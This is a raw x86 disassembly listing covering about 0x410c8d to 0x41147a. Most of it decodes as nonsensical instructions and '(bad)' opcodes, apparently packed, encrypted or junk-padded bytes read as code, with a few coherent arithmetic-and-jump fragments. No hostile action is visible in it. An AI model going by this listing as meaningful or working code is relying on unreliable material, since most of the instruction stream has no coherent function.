  410c8d:	in     eax,0xcc
  410c8f:	push   0x29
  410c91:	sbb    eax,0xb2feb9fb
  410c96:	xor    esp,edi
  410c98:	xchg   ecx,eax
  410c99:	repnz repz enter 0x3710,0x89
  410c9f:	lahf   
  410ca0:	retf   0x52cc
  410ca3:	and    BYTE PTR [esi],bh
  410ca5:	out    0x63,eax
  410ca7:	outs   dx,DWORD PTR ds:[esi]
  410ca8:	mov    ah,0x89
  410caa:	std    
  410cab:	je     0x410c3b
  410cad:	das    
  410cae:	cmp    BYTE PTR [esi-0x511b6fbd],0x98
  410cb5:	mov    esp,0x6f10e076
  410cba:	popf   
  410cbb:	pop    ss
  410cbc:	fs pop esp
  410cbe:	aad    0x66
  410cc0:	clc    
  410cc1:	and    cl,BYTE PTR [edx-0x21]
  410cc4:	fisubr WORD PTR [ecx]
  410cc6:	sub    al,0x9a
  410cc8:	push   eax
  410cc9:	xchg   ecx,eax
  410cca:	int    0xa2
  410ccc:	leave  
  410ccd:	les    ecx,FWORD PTR [edi+0x306b8702]
  410cd3:	adc    cl,dh
  410cd5:	jns    0x410d25
  410cd7:	dec    esi
  410cd8:	mov    DWORD PTR [edi],edi
  410cda:	shl    DWORD PTR [esi-0x4b],cl
  410cdd:	ins    BYTE PTR es:[edi],dx
  410cde:	cdq    
  410cdf:	push   ds
  410ce0:	mov    edi,DWORD PTR [eax+edx*4-0x102974df]
  410ce7:	ins    BYTE PTR es:[edi],dx
  410ce8:	ds ja  0x410ca7
  410ceb:	jmp    0x410c7c
  410ced:	loope  0x410cf5
  410cef:	push   es
  410cf0:	shr    DWORD PTR [ebx+eiz*2+0x5377ba4b],1
  410cf7:	rcr    BYTE PTR [ebx+edx*8+0x25],1
  410cfb:	cdq    
  410cfc:	xchg   ebp,eax
  410cfd:	in     eax,0x10
  410cff:	mov    esp,0x75a84790
  410d04:	loop   0x410d57
  410d06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d07:	lods   eax,DWORD PTR ds:[esi]
  410d08:	repz xchg ebp,eax
  410d0a:	fwait
  410d0b:	mov    ds:0xa383327e,al
  410d10:	inc    esp
  410d11:	add    al,0x9b
  410d13:	(bad)  
  410d14:	pop    edx
  410d15:	je     0x410d85
  410d17:	cld    
  410d18:	xchg   esi,eax
  410d19:	xchg   DWORD PTR [ecx],ebp
  410d1b:	cmp    ebx,esp
  410d1d:	xchg   ebx,eax
  410d1e:	out    0xbd,al
  410d20:	mov    BYTE PTR [edx+0x5d],dh
  410d23:	pop    es
  410d24:	dec    edi
  410d25:	push   es
  410d26:	add    edi,ecx
  410d28:	add    edx,ecx
  410d2a:	imul   edx,edi
  410d2d:	mov    edi,DWORD PTR [ebp-0x8]
  410d30:	mov    ebx,DWORD PTR [ebp-0x10]
  410d33:	sub    ebx,edi
  410d35:	cmp    ebx,edx
  410d37:	ja     0x410d45
  410d3d:	mov    edx,DWORD PTR [ebp-0x2c]
  410d40:	jmp    0x411f76
  410d45:	mov    edx,DWORD PTR [ebp-0x34]
  410d48:	mov    edi,DWORD PTR [ebp-0x4]
  410d4b:	xor    edx,eax
  410d4d:	xor    edi,eax
  410d4f:	jmp    0x410fd7
  410d54:	lds    edi,FWORD PTR [edx+edx*8]
  410d57:	ds fxch st(6)
  410d5a:	fxch   st(3)
  410d5c:	adc    ecx,edx
  410d5e:	add    dh,BYTE PTR [edi]
  410d60:	fwait
  410d61:	adc    DWORD PTR [ecx+0x7854f8ef],ebx
  410d67:	js     0x410d4e
  410d69:	jle    0x410de3
  410d6b:	js     0x410cf7
  410d6d:	jle    0x410dd4
  410d6f:	fistp  WORD PTR [ecx-0xb]
  410d72:	mov    ebp,0x62e084f0
  410d77:	push   edi
  410d78:	call   0x48e6:0xb82edf5b
  410d7f:	add    DWORD PTR [eax-0x5c365e9d],esp
  410d85:	push   ebx
  410d86:	popf   
  410d87:	fdiv   DWORD PTR [ebp-0x78]
  410d8a:	test   al,0x81
  410d8c:	ss (bad) 
  410d8e:	mov    WORD PTR [edx],ss
  410d90:	push   ds
  410d91:	enter  0x71f4,0x8e
  410d95:	mov    ecx,0x4b7f556f
  410d9a:	or     al,0x84
  410d9c:	pop    ecx
  410d9d:	div    DWORD PTR [edx]
  410d9f:	aam    0xac
  410da1:	mov    bl,0x14
  410da3:	xor    DWORD PTR [esi+0x5b37108e],eax
  410da9:	jae    0x410d78
  410dab:	mov    al,ds:0x1f0843ff
  410db0:	jb     0x410dec
  410db2:	hlt    
  410db3:	fimul  WORD PTR [edi+0x69e7a175]
  410db9:	sub    DWORD PTR ds:0xe4f9d3be,edi
  410dbf:	xor    eax,0xdcb41ac7
  410dc4:	loop   0x410dd5
  410dc6:	or     BYTE PTR [ebx+0x4389ddba],bh
  410dcc:	xchg   edx,eax
  410dcd:	lods   eax,DWORD PTR ds:[esi]
  410dce:	retf   
  410dcf:	scas   eax,DWORD PTR es:[edi]
  410dd0:	lods   eax,DWORD PTR ds:[esi]
  410dd1:	mov    esi,0x7518c9ba
  410dd6:	fisub  WORD PTR [edx]
  410dd8:	xor    edx,DWORD PTR [edx-0x7]
  410ddb:	push   ebp
  410ddc:	repz clc 
  410dde:	xchg   BYTE PTR [esi-0x6682b7da],cl
  410de4:	adc    BYTE PTR [edx],ah
  410de6:	cmp    BYTE PTR [edx+0x43],bh
  410de9:	add    al,0x4d
  410deb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dec:	cld    
  410ded:	cmp    BYTE PTR [edi-0xafdab12],0xfe
  410df4:	push   0x3f
  410df6:	and    esi,edi
  410df8:	aas    
  410df9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410dfa:	inc    esp
  410dfb:	into   
  410dfc:	daa    
  410dfd:	(bad)  [esp]
  410e00:	sbb    DWORD PTR [edx],edi
  410e02:	add    esp,DWORD PTR [ecx-0x32]
  410e05:	mov    eax,0x21aa2a7
  410e0a:	pop    es
  410e0b:	push   edx
  410e0c:	in     eax,0x65
  410e0e:	pop    es
  410e0f:	bound  ebx,QWORD PTR [ecx]
  410e11:	jecxz  0x410de3
  410e13:	adc    edi,DWORD PTR [esi+0x5fe85616]
  410e19:	add    BYTE PTR [ecx-0x26016164],cl
  410e1f:	js     0x410e65
  410e21:	add    eax,0xae8a7080
  410e26:	xchg   ebx,eax
  410e27:	sbb    BYTE PTR [esi+0xa6eb14c],bl
  410e2d:	pusha  
  410e2e:	inc    esi
  410e2f:	cmc    
  410e30:	in     eax,dx
  410e31:	test   al,0x1a
  410e33:	adc    BYTE PTR [edx-0x18441791],dh
  410e39:	pop    es
  410e3a:	inc    ecx
  410e3b:	jge    0x410e6f
  410e3d:	push   0xffffff86
  410e3f:	sahf   
  410e40:	cmp    BYTE PTR [eax+0x38],dh
  410e43:	aad    0x76
  410e45:	inc    esi
  410e46:	sub    DWORD PTR [ecx-0x49],ebp
  410e49:	stos   DWORD PTR es:[edi],eax
  410e4a:	or     DWORD PTR [ebx+0x4e2e2363],ebx
  410e50:	clc    
  410e51:	pop    eax
  410e52:	mov    ebp,0x432e91ba
  410e57:	mov    esi,0xb16ed59b
  410e5c:	ror    BYTE PTR [ebx+0x21],0xe2
  410e60:	test   al,0xbe
  410e62:	jg     0x410e51
  410e64:	cli    
  410e65:	pop    esp
  410e66:	stos   DWORD PTR es:[edi],eax
  410e67:	jp     0x410e47
  410e69:	(bad)  
  410e6a:	(bad)  
  410e6b:	outs   dx,DWORD PTR ds:[esi]
  410e6d:	mov    eax,0x1830cf15
  410e72:	push   ds
  410e73:	scas   al,BYTE PTR es:[edi]
  410e74:	pop    ss
  410e75:	mov    bh,0x8a
  410e77:	js     0x410e2c
  410e79:	push   ebx
  410e7a:	lock xchg edx,eax
  410e7c:	push   ebx
  410e7d:	ja     0x410e38
  410e7f:	jp     0x410e76
  410e81:	and    al,0x23
  410e83:	jmp    0x6b6c:0xe153b1cc
  410e8a:	ds jnp 0x410ec3
  410e8d:	stos   DWORD PTR es:[edi],eax
  410e8e:	jnp    0x410e85
  410e90:	ficom  WORD PTR [ecx-0x68]
  410e93:	sub    al,0x5e
  410e95:	xor    DWORD PTR [edx],esp
  410e97:	push   ebp
  410e98:	shr    bh,0x55
  410e9b:	xor    esi,DWORD PTR [esi+0x7e]
  410e9e:	pop    es
  410e9f:	adc    DWORD PTR [edi+0x76],esi
  410ea2:	jo     0x410e3a
  410ea4:	xor    al,0xbe
  410ea6:	jb     0x410e33
  410ea8:	cmp    al,0xe6
  410eaa:	(bad)
  410eae:	mov    WORD PTR [edx+0x6494e89b],?
  410eb4:	gs repz arpl di,si
  410eb8:	push   ecx
  410eb9:	mov    ah,0x6a
  410ebb:	neg    DWORD PTR [esi+0x28]
  410ebe:	les    ecx,FWORD PTR [ecx+0x368e2e4]
  410ec4:	add    eax,0xed6bd94f
  410ec9:	sar    BYTE PTR [ecx-0x58dd02d8],1
  410ecf:	or     BYTE PTR [edx+0x11642254],0x5e
  410ed6:	mov    DWORD PTR [ecx-0x14749cf9],eax
  410edc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410edd:	add    BYTE PTR [edi-0x55eefba3],bh
  410ee3:	mov    ch,BYTE PTR [esi+0x40b2d161]
  410ee9:	test   BYTE PTR [ecx-0x5eabcf1e],dl
  410eef:	or     BYTE PTR [esi-0x31],dl
  410ef2:	das    
  410ef3:	das    
  410ef4:	cmc    
  410ef5:	cmp    bh,BYTE PTR [edi+ecx*8+0x3c]
  410ef9:	inc    ebx
  410efa:	jle    0x410ee5
  410efc:	jmp    0x65a1:0x5d0cb40a
  410f03:	fdivp  st(4),st
  410f05:	pop    ss
  410f06:	xchg   BYTE PTR [ebx+0x5896e330],ah
  410f0c:	in     eax,dx
  410f0d:	in     eax,dx
  410f0e:	lahf   
  410f0f:	pop    ebp
  410f10:	xchg   ebp,eax
  410f11:	out    dx,al
  410f12:	xor    al,0x18
  410f14:	xor    al,0x1
  410f16:	xor    al,0xc1
  410f18:	rcr    DWORD PTR [edi],0x25
  410f1b:	aas    
  410f1c:	sub    al,0x4f
  410f1e:	fild   DWORD PTR [ecx-0x60d4f3a8]
  410f24:	xchg   ebx,eax
  410f25:	mov    eax,0x658b8ea5
  410f2a:	aaa    
  410f2b:	mov    bh,bl
  410f2d:	sub    al,0x6b
  410f2f:	push   edx
  410f30:	clc    
  410f31:	in     eax,dx
  410f32:	mov    cl,0x0
  410f34:	mov    ch,0x3f
  410f36:	arpl   WORD PTR [edx-0x6cc15510],bx
  410f3c:	dec    eax
  410f3d:	cmp    ecx,DWORD PTR [ebp+0x5d9333cb]
  410f43:	out    0x55,al
  410f45:	pop    es
  410f46:	jge    0x410f9e
  410f48:	sar    bl,1
  410f4a:	out    dx,eax
  410f4b:	call   0xfbbf:0xd9d53e5a
  410f52:	ds out 0x30,al
  410f55:	jl     0x410f31
  410f57:	fisttp QWORD PTR [edx+ebx*2-0x11]
  410f5b:	aam    0xb7
  410f5d:	outs   dx,BYTE PTR ds:[esi]
  410f5e:	pop    ss
  410f5f:	xchg   BYTE PTR ds:0xe5de5225,bl
  410f65:	ficomp DWORD PTR [eax]
  410f67:	xor    bh,BYTE PTR [ecx+ebx*8+0x1f0fc098]
  410f6e:	jg     0x410f85
  410f70:	fbstp  TBYTE PTR [ecx-0x58e017fd]
  410f76:	or     bh,0x4c
  410f79:	or     DWORD PTR [ecx+0x4f6363de],ebx
  410f7f:	cli    
  410f80:	jecxz  0x410f8d
  410f82:	and    eax,0x6bee2c65
  410f87:	and    DWORD PTR [ebx+0x64ef935f],esp
  410f8d:	inc    ecx
  410f8e:	xor    DWORD PTR [esi+0x3b],0x6608c15e
  410f95:	adc    al,0xdd
  410f97:	enter  0xaefb,0xe8
  410f9b:	sub    edx,DWORD PTR [ecx+0x523a8d5f]
  410fa1:	mov    ds:0x3d71064,al
  410fa6:	push   0xf165f484
  410fab:	popf   
  410fac:	jns    0x410f31
  410fae:	int3   
  410faf:	mov    ds:0x52e523d4,eax
  410fb4:	mov    dl,0x37
  410fb6:	fstp   TBYTE PTR [ecx+0x1e22edda]
  410fbc:	ins    BYTE PTR es:[edi],dx
  410fbd:	xchg   ebp,eax
  410fbe:	dec    edi
  410fbf:	mov    edi,0x81564c1b
  410fc4:	aas    
  410fc5:	sbb    al,bl
  410fc7:	lea    edx,[edi-0x71]
  410fca:	inc    esp
  410fcb:	jnp    0x410fa4
  410fcd:	sbb    DWORD PTR [edx-0xa],edx
  410fd0:	pop    edx
  410fd1:	fcom   QWORD PTR [edi]
  410fd3:	enter  0xb56b,0x0
  410fd7:	add    edi,ecx
  410fd9:	jmp    0x411261
  410fde:	int3   
  410fdf:	into   
  410fe0:	ror    esp,0xc1
  410fe3:	rcl    ecx,cl
  410fe5:	into   
  410fe6:	jbe    0x410f92
  410fe8:	inc    esp
  410fe9:	add    ax,0x9b99
  410fed:	dec    edx
  410fee:	gs pop edx
  410ff0:	js     0x41106a
  410ff2:	in     eax,0x7e
  410ff4:	js     0x41106e
  410ff6:	ror    DWORD PTR [esi],1
  410ff8:	popw   es
  410ffa:	fadd   DWORD PTR [esi+ebp*8]
  410ffd:	push   0xe5fe8097
  411002:	(bad)  
  411004:	ja     0x411042
  411006:	call   0x94e6:0x2f086725
  41100d:	dec    edi
  41100e:	push   es
  41100f:	mov    ah,0x7c
  411011:	jg     0x410fbc
  411013:	jbe    0x411032
  411015:	cs cmc 
  411017:	xchg   ecx,eax
  411018:	aad    0xa4
  41101a:	es jae 0x411046
  41101d:	aaa    
  41101e:	jno    0x410fd3
  411020:	call   0x7c34:0xa731b9a7
  411027:	dec    ecx
  411028:	dec    esp
  411029:	jmp    0x78d16073
  41102e:	pop    eax
  41102f:	push   edx
  411030:	(bad)  
  411031:	fs mov ecx,0x9b644435
  411037:	dec    ebp
  411038:	rcr    al,cl
  41103a:	jge    0x411022
  41103c:	add    al,0x7
  41103e:	xchg   DWORD PTR [esi],esi
  411040:	cmp    eax,esp
  411042:	cli    
  411043:	add    al,0x1f
  411045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411046:	ja     0x4110ad
  411048:	leave  
  411049:	or     eax,0x53959765
  41104e:	push   ecx
  41104f:	cdq    
  411050:	adc    al,0x5c
  411052:	dec    edx
  411053:	mov    dh,0x9f
  411055:	clc    
  411056:	xor    DWORD PTR [ebp-0x4cb02f80],ebx
  41105c:	mov    cl,0xfd
  41105e:	hlt    
  41105f:	and    dl,BYTE PTR [ecx-0x2c14e963]
  411065:	and    esp,eax
  411067:	out    dx,al
  411068:	lds    eax,FWORD PTR [ebx]
  41106a:	aad    0x38
  41106c:	lahf   
  41106d:	push   0x70
  41106f:	ficomp WORD PTR [edi+0x6b6288ac]
  411075:	bound  ebp,QWORD PTR [ebp-0x455ae6f3]
  41107b:	push   ebx
  41107c:	sbb    BYTE PTR [esi-0x2],0x9e
  411080:	retf   0x8e32
  411083:	mov    ah,0x6f
  411085:	xchg   edx,eax
  411086:	push   0xa7b93dc1
  41108b:	mov    cl,0xeb
  41108d:	adc    edi,DWORD PTR [esi+eax*4+0x34e159a5]
  411094:	fxch   st(2)
  411096:	xchg   edx,eax
  411097:	or     eax,0xb3401b92
  41109c:	xchg   ecx,eax
  41109d:	mov    esp,0xae5a0fab
  4110a2:	addr16 pusha 
  4110a4:	test   eax,0xd203e847
  4110a9:	xchg   edx,eax
  4110aa:	loope  0x4110bf
  4110ac:	retf   0x7ac4
  4110af:	xchg   edi,eax
  4110b0:	retf   0xf166
  4110b3:	js     0x4110d2
  4110b5:	fcom   QWORD PTR [esi+0x15fcf575]
  4110bb:	dec    edi
  4110bc:	push   edi
  4110bd:	xor    BYTE PTR [esp+ecx*8],0xf2
  4110c1:	imul   cl
  4110c3:	ret    
  4110c4:	or     esp,DWORD PTR ds:0x878d6544
  4110ca:	xor    ecx,esi
  4110cc:	neg    BYTE PTR [ecx-0x5f]
  4110cf:	shl    DWORD PTR [esi+0x48f2ceb6],cl
  4110d5:	(bad)  
  4110d6:	or     al,0x60
  4110d8:	out    dx,al
  4110d9:	and    edi,esi
  4110db:	stos   BYTE PTR es:[edi],al
  4110dc:	lds    ebx,FWORD PTR [ecx-0x61]
  4110df:	and    al,0xa6
  4110e1:	jg     0x411072
  4110e3:	jecxz  0x411100
  4110e5:	sbb    eax,DWORD PTR [edi-0x26]
  4110e8:	shr    DWORD PTR ds:0x5ef61bc8,0x10
  4110ef:	sub    dh,dl
  4110f1:	mov    ch,0xb8
  4110f3:	lods   eax,DWORD PTR ds:[esi]
  4110f4:	std    
  4110f5:	ja     0x4110ad
  4110f7:	xchg   ebp,eax
  4110f8:	cmp    BYTE PTR [edi+0x5b],ah
  4110fb:	dec    esp
  4110fc:	mov    ah,0x37
  4110fe:	or     DWORD PTR [edx+0x1e9ad353],edi
  411104:	call   0xf00e:0xa6a32916
  41110b:	mov    al,0x8c
  41110d:	mov    edi,0xc1e295f1
  411112:	cld    
  411113:	daa    
  411114:	lds    esi,FWORD PTR [ecx-0x11]
  411117:	cmp    DWORD PTR [ebp-0x5132ab61],0x3f
  41111e:	pop    edi
  41111f:	mov    edx,0x50d40ae2
  411124:	cmp    eax,0xbf993b2c
  411129:	mov    dl,BYTE PTR [eax+0x59ca559c]
  41112f:	fidivr WORD PTR fs:[ebp-0x38090154]
  411136:	lea    edi,[esp+eax*1]
  411139:	int    0xfd
  41113b:	ja     0x411195
  41113d:	les    ebx,FWORD PTR ss:[edi]
  411140:	jecxz  0x41110f
  411142:	xor    al,ah
  411144:	lahf   
  411145:	into   
  411146:	sub    BYTE PTR gs:[ecx+0x48148d1f],0x7c
  41114e:	outs   dx,BYTE PTR ds:[esi]
  41114f:	jb     0x4110e4
  411151:	and    eax,0x6e987d
  411156:	push   edi
  411157:	daa    
  411158:	fwait
  411159:	jnp    0x4111b8
  41115b:	sbb    eax,0x7cca5a36
  411160:	fbstp  TBYTE PTR [ecx+0x63635d1c]
  411166:	xchg   BYTE PTR [esi+0x30f71b36],ah
  41116c:	ret    
  41116d:	retf   
  41116e:	in     al,dx
  41116f:	es loop 0x4111c4
  411172:	call   DWORD PTR [edi+0x12]
  411175:	loope  0x41116a
  411177:	cdq    
  411178:	out    0x3e,eax
  41117a:	rcr    BYTE PTR [ebx+ebp*8-0x36],cl
  41117e:	push   eax
  41117f:	mov    edx,0x32d89eb1
  411184:	cwde   
  411185:	ret    
  411186:	inc    edx
  411187:	in     eax,0x74
  411189:	ins    BYTE PTR es:[edi],dx
  41118a:	sub    al,ah
  41118c:	retf   
  41118d:	scas   eax,DWORD PTR es:[edi]
  41118e:	jae    0x4111dd
  411190:	fstp   DWORD PTR [edx]
  411192:	mov    ah,0x7a
  411194:	out    dx,eax
  411195:	fwait
  411196:	jo     0x411197
  411198:	jge    0x4111bd
  41119a:	call   0xd20567b4
  41119f:	cmp    DWORD PTR [eax],edx
  4111a1:	jbe    0x411181
  4111a3:	fiadd  WORD PTR [eax-0x36]
  4111a6:	rcr    eax,cl
  4111a8:	ret    
  4111a9:	mov    esi,0xa79309af
  4111ae:	sub    BYTE PTR [ebp+0x6],bl
  4111b1:	add    BYTE PTR [ebp*8+0x5efd2c6c],ah
  4111b8:	mov    WORD PTR [eax+ebp*4-0x16431c8e],ds
  4111bf:	sti    
  4111c0:	sub    bl,BYTE PTR [ebx+0x4a482458]
  4111c6:	push   0x1e4e0537
  4111cb:	scas   al,BYTE PTR es:[edi]
  4111cc:	xchg   ecx,eax
  4111cd:	loope  0x4111e0
  4111cf:	mov    esp,0x6a5220bb
  4111d4:	outs   dx,BYTE PTR ds:[esi]
  4111d5:	lds    eax,FWORD PTR [ecx]
  4111d7:	fiadd  WORD PTR [esi]
  4111d9:	adc    BYTE PTR [ecx+0x6f8775aa],ah
  4111df:	es addr16 hlt 
  4111e2:	mov    esp,0x40385ca9
  4111e7:	lods   eax,DWORD PTR ds:[esi]
  4111e8:	outs   dx,BYTE PTR ds:[esi]
  4111e9:	xor    al,0x19
  4111eb:	scas   eax,DWORD PTR es:[edi]
  4111ec:	pusha  
  4111ed:	fisttp QWORD PTR [eax+0x75]
  4111f0:	xor    ch,BYTE PTR [eax]
  4111f2:	mov    ds:0xfdda3a,eax
  4111f7:	adc    BYTE PTR [ebx-0x29],cl
  4111fa:	add    edi,DWORD PTR [ecx+ecx*2-0x70]
  4111fe:	and    ch,0x30
  411201:	std    
  411202:	xchg   esi,eax
  411203:	rcl    edi,cl
  411205:	fcom   QWORD PTR [ebp+0x4d382fe1]
  41120b:	jp     0x41124a
  41120d:	dec    esi
  41120e:	pop    edi
  41120f:	sbb    esp,DWORD PTR [esi+0x169f7119]
  411215:	and    al,dh
  411217:	push   ds
  411218:	repnz fbld TBYTE PTR [esi-0x57ea7b36]
  41121f:	addr16 sbb eax,0x3d59a97b
  411225:	xor    bl,0xf3
  411228:	inc    edx
  411229:	xor    edi,DWORD PTR [ebx+ebx*8-0x5997f078]
  411230:	int3   
  411231:	xor    al,0xe1
  411233:	bound  eax,QWORD PTR [eax-0x637079d6]
  411239:	(bad)  
  41123a:	int3   
  41123b:	(bad)  [esi+0x4a]
  41123e:	int    0x3b
  411240:	dec    edi
  411241:	bound  edx,QWORD PTR [ecx+0x72]
  411244:	add    bl,BYTE PTR [esi]
  411246:	in     al,0x6d
  411248:	or     DWORD PTR [edi+esi*1-0x4cbfbccc],0x34
  411250:	add    eax,0x7806c1fe
  411255:	or     DWORD PTR [ebp+0x4b06598b],esp
  41125b:	sbb    ebp,DWORD PTR [esi]
  41125d:	rol    edx,0xcc
  411260:	push   esi
  411261:	add    edx,ecx
  411263:	imul   edx,edi
  411266:	jmp    0x4114ee
  41126b:	aas    
  41126c:	xlat   BYTE PTR ds:[ebx]
  41126d:	xlat   BYTE PTR ds:[ebx]
  41126e:	retf   
  41126f:	xlat   BYTE PTR ds:[ebx]
  411270:	retf   
  411271:	rcr    ebx,cl
  411273:	and    cl,ah
  411275:	or     BYTE PTR [eax-0x1a],al
  411278:	clc    
  411279:	into   
  41127a:	ja     0x41124e
  41127c:	pop    edi
  41127d:	js     0x4112f7
  41127f:	in     eax,0x7e
  411281:	js     0x4112fb
  411283:	aad    0xac
  411285:	jp     0x411255
  411287:	popf   
  411288:	xor    edx,ebp
  41128a:	inc    edi
  41128b:	retf   
  41128c:	xor    dl,BYTE PTR [eax+0x69ed19fd]
  411292:	jne    0x4112b5
  411294:	icebp  
  411295:	mov    BYTE PTR [ebx+0xc1da57],al
  41129b:	shl    BYTE PTR [eax+0xed93239],0xc0
  4112a2:	add    al,0x96
  4112a4:	jmp    0x7da2779
  4112a9:	aam    0x33
  4112ab:	jl     0x4112c4
  4112ad:	test   DWORD PTR [ebx-0x44],ebx
  4112b0:	and    esp,ebx
  4112b2:	ret    0x2521
  4112b5:	lahf   
  4112b6:	sub    BYTE PTR [ecx-0x333a46c8],bh
  4112bc:	push   0x6b
  4112be:	cs mov dh,0x67
  4112c1:	xchg   ebx,eax
  4112c2:	xor    eax,0xbe4f2ac6
  4112c7:	test   eax,0xc9f27f82
  4112cc:	in     eax,0x4e
  4112ce:	xchg   DWORD PTR [edi],esp
  4112d0:	dec    ebx
  4112d1:	ins    DWORD PTR es:[edi],dx
  4112d2:	mov    WORD PTR [edi+0x5514312c],?
  4112d8:	fdivr  QWORD PTR [ecx]
  4112da:	mov    WORD PTR gs:[esi-0x2c2fb0a],es
  4112e1:	adc    BYTE PTR [ecx+0x26],0x64
  4112e5:	hlt    
  4112e6:	arpl   WORD PTR [eax-0xb],di
  4112e9:	stc    
  4112ea:	jae    0x411351
  4112ec:	add    bh,cl
  4112ee:	std    
  4112ef:	pop    ebp
  4112f0:	call   0xed4f1a99
  4112f5:	int    0x4c
  4112f7:	aaa    
  4112f8:	shr    dl,cl
  4112fa:	test   DWORD PTR [edx-0x44bbf706],ebp
  411300:	out    0x4e,al
  411302:	ss pushf 
  411304:	sbb    DWORD PTR [eax+0x1e],ebx
  411307:	sti    
  411308:	in     al,dx
  411309:	test   edx,esi
  41130b:	add    edi,DWORD PTR [ebp-0x52]
  41130e:	stos   BYTE PTR es:[edi],al
  41130f:	or     bl,BYTE PTR [ebx]
  411311:	enter  0x2086,0x6b
  411315:	pop    esi
  411316:	adc    eax,0xb11a9271
  41131b:	pop    ecx
  41131c:	pop    edx
  41131d:	sub    al,0x66
  41131f:	stc    
  411320:	clc    
  411321:	(bad)  
  411322:	mov    ch,0xa8
  411324:	jne    0x4112e4
  411326:	test   al,0xab
  411328:	outs   dx,DWORD PTR ds:[esi]
  411329:	gs mov ebp,0x7c311e59
  41132f:	aaa    
  411330:	lock add al,0x7e
  411333:	jbe    0x41136d
  411335:	mov    al,0xd1
  411337:	jbe    0x411361
  411339:	push   eax
  41133a:	daa    
  41133b:	or     bl,dl
  41133d:	aas    
  41133e:	in     al,dx
  41133f:	dec    edx
  411340:	push   ecx
  411341:	stc    
  411342:	lods   al,BYTE PTR ds:[esi]
  411343:	cmc    
  411344:	sub    al,0x9d
  411346:	lahf   
  411347:	push   ebx
  411348:	jnp    0x411331
  41134a:	imul   ebx,esp,0x24
  41134d:	inc    edx
  41134e:	mov    bl,0x55
  411350:	popa   
  411351:	cmp    eax,0x65d198ad
  411356:	push   ebp
  411357:	lods   al,BYTE PTR ds:[esi]
  411358:	loopne 0x411383
  41135a:	data16 jge 0x4113a7
  41135d:	sbb    bl,BYTE PTR [esi]
  41135f:	ins    DWORD PTR es:[edi],dx
  411360:	sar    DWORD PTR [ecx+0x77a8f003],cl
  411366:	xchg   edi,eax
  411367:	test   al,0xc9
  411369:	fimul  WORD PTR [edx]
  41136b:	mov    eax,0x321f5edf
  411370:	and    al,0x54
  411372:	push   ds
  411373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411374:	out    dx,al
  411375:	xchg   BYTE PTR [ebx+0x27cf4ea6],dl
  41137b:	outs   dx,DWORD PTR ds:[esi]
  41137c:	adc    edi,edx
  41137e:	cmp    eax,0xb17f929a
  411383:	xchg   BYTE PTR ds:0xf7744b5c,al
  411389:	imul   dh
  41138b:	mov    ds:0x95aeb62b,eax
  411390:	dec    ecx
  411391:	adc    DWORD PTR [edx+0x4],0xf7e564fc
  411398:	and    bh,BYTE PTR [ebx-0x11]
  41139b:	test   BYTE PTR [ecx+0x8],0xc9
  41139f:	in     eax,dx
  4113a0:	xchg   ecx,eax
  4113a1:	jmp    0xb251:0xe738c6c9
  4113a8:	cdq    
  4113a9:	mov    edx,0xe1b60283
  4113ae:	adc    al,0xa8
  4113b0:	loopne 0x41134c
  4113b2:	pop    edi
  4113b3:	mov    DWORD PTR [esi],edx
  4113b5:	push   cs
  4113b6:	push   0xe1285b82
  4113bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113bc:	push   ds
  4113bd:	(bad)  
  4113be:	das    
  4113bf:	rcr    ch,0xe7
  4113c2:	or     bl,0x58
  4113c5:	sbb    BYTE PTR [eax-0x2529bb89],ah
  4113cb:	push   esi
  4113cc:	xchg   ebp,eax
  4113cd:	outs   dx,DWORD PTR gs:[esi]
  4113cf:	add    eax,0x90a616cf
  4113d4:	out    0xc1,al
  4113d6:	jne    0x41143d
  4113d8:	jg     0x411370
  4113da:	loope  0x411433
  4113dc:	test   eax,0x6dccc1a
  4113e1:	out    0xe4,eax
  4113e3:	and    cl,bh
  4113e5:	aaa    
  4113e6:	cs retf 
  4113e8:	in     eax,dx
  4113e9:	stc    
  4113ea:	sub    eax,0x9473073f
  4113ef:	(bad)  
  4113f1:	push   eax
  4113f2:	icebp  
  4113f3:	stc    
  4113f4:	cmp    DWORD PTR [ebp-0x2170d122],edx
  4113fa:	lods   eax,DWORD PTR ds:[esi]
  4113fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113fd:	inc    ebp
  4113fe:	mov    cl,0xb8
  411400:	shl    edi,1
  411402:	cwde   
  411403:	lds    ebp,FWORD PTR [edx]
  411405:	sbb    BYTE PTR [edi+0x4709dace],al
  41140b:	ret    0x5948
  41140e:	jns    0x411483
  411410:	jnp    0x4113b0
  411412:	push   ebp
  411413:	and    BYTE PTR [ecx-0x61],bh
  411416:	aam    0x44
  411418:	not    BYTE PTR [esi+0x3d]
  41141b:	push   ebp
  41141c:	lods   al,BYTE PTR ds:[esi]
  41141d:	fmul   st,st(7)
  41141f:	sbb    eax,0x85449d34
  411424:	and    DWORD PTR [edi],esi
  411426:	or     ch,dl
  411428:	js     0x4113b6
  41142a:	iret   
  41142b:	push   ds
  41142c:	pop    ebp
  41142d:	sti    
  41142e:	jmp    0x648b5405
  411433:	int3   
  411434:	aas    
  411435:	sbb    BYTE PTR [ecx-0x14be0200],cl
  41143b:	pop    ebp
  41143c:	mov    dl,0xc8
  41143e:	sbb    cl,dl
  411440:	ins    DWORD PTR es:[edi],dx
  411441:	stc    
  411442:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411443:	leave  
  411444:	ret    
  411445:	lock adc eax,0xb2eef092
  41144b:	mov    ss,ecx
  41144d:	(bad)  
  41144e:	hlt    
  41144f:	pop    ecx
  411450:	ret    0xb964
  411453:	lahf   
  411454:	fmul   DWORD PTR [ebx]
  411456:	mov    cl,0xbd
  411458:	nop
  411459:	push   fs
  41145b:	push   cs
  41145c:	add    edi,DWORD PTR [ebx*2+0x5ced932e]
  411463:	jl     0x411430
  411465:	loop   0x4113f6
  411467:	adc    cl,BYTE PTR ds:[esi+0x12185c04]
  41146e:	in     al,dx
  41146f:	cdq    
  411470:	jp     0x411457
  411472:	sub    eax,0xd4e618da
  411477:	and    dl,bh
  411479:	inc    esp
  41147a:	idiv   DWORD PTR [ebx+ebp*1+0x79]
